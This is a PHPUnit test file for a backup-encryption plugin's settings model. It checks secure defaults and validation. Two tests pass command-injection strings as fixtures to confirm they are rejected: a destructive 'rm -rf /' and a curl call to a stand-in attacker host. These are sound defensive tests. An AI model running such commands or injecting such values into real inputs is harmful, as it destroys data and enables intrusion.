<?php

declare(strict_types=1);

namespace anchovy\securebackups\tests\unit;

use anchovy\securebackups\models\Settings;
use PHPUnit\Framework\TestCase;

/**
 * Covers settings defaults and validation.
 *
 * The defaults matter more than usual here: they decide whether a site that installs
 * the plugin and reads no documentation ends up with encrypted backups or plaintext
 * ones.
 */
final class SettingsTest extends TestCase
{
    public function testDefaultsAreSafe(): void
    {
        $settings = new Settings();

        self::assertTrue($settings->enabled, 'Backups should be encrypted out of the box.');
        self::assertTrue($settings->compress, 'Backups should be compressed out of the box.');
        self::assertTrue(
            $settings->failIfUnableToEncrypt,
            'The default must be to fail rather than leave a plaintext dump on disk.'
        );
        self::assertSame(
            Settings::UNENCRYPTED_PROMPT,
            $settings->unencryptedRestore,
            'An unencrypted restore should be questioned by default.'
        );
        self::assertSame('SECURE_BACKUPS_KEY', $settings->keyEnvVar);
    }

    public function testDefaultsValidate(): void
    {
        self::assertTrue((new Settings())->validate());
    }

    public function testRejectsAnUnknownUnencryptedRestorePolicy(): void
    {
        $settings = new Settings();
        $settings->unencryptedRestore = 'sometimes';

        self::assertFalse($settings->validate());
        self::assertArrayHasKey('unencryptedRestore', $settings->getErrors());
    }

    public function testAcceptsEveryDocumentedUnencryptedRestorePolicy(): void
    {
        foreach ([Settings::UNENCRYPTED_DENY, Settings::UNENCRYPTED_PROMPT, Settings::UNENCRYPTED_ALLOW] as $policy) {
            $settings = new Settings();
            $settings->unencryptedRestore = $policy;

            self::assertTrue($settings->validate(), "Policy '$policy' should be valid.");
        }
    }

    public function testRejectsAnEnvVarNameThatIsNotShellSafe(): void
    {
        $settings = new Settings();
        $settings->keyEnvVar = 'BAD NAME; rm -rf /';

        self::assertFalse($settings->validate());
        self::assertArrayHasKey('keyEnvVar', $settings->getErrors());
    }

    public function testRejectsACipherThatIsNotShellSafe(): void
    {
        // The cipher is interpolated into the restore command string, so anything
        // outside [a-z0-9-] must never reach it.
        $settings = new Settings();
        $settings->cipher = 'aes-256-cbc; curl evil.example';

        self::assertFalse($settings->validate());
        self::assertArrayHasKey('cipher', $settings->getErrors());
    }

    public function testRejectsANonPositiveTimeout(): void
    {
        $settings = new Settings();
        $settings->timeout = 0;

        self::assertFalse($settings->validate());
        self::assertArrayHasKey('timeout', $settings->getErrors());
    }

    public function testRequiresAKeyEnvVarName(): void
    {
        $settings = new Settings();
        $settings->keyEnvVar = '';

        self::assertFalse($settings->validate());
        self::assertArrayHasKey('keyEnvVar', $settings->getErrors());
    }
}
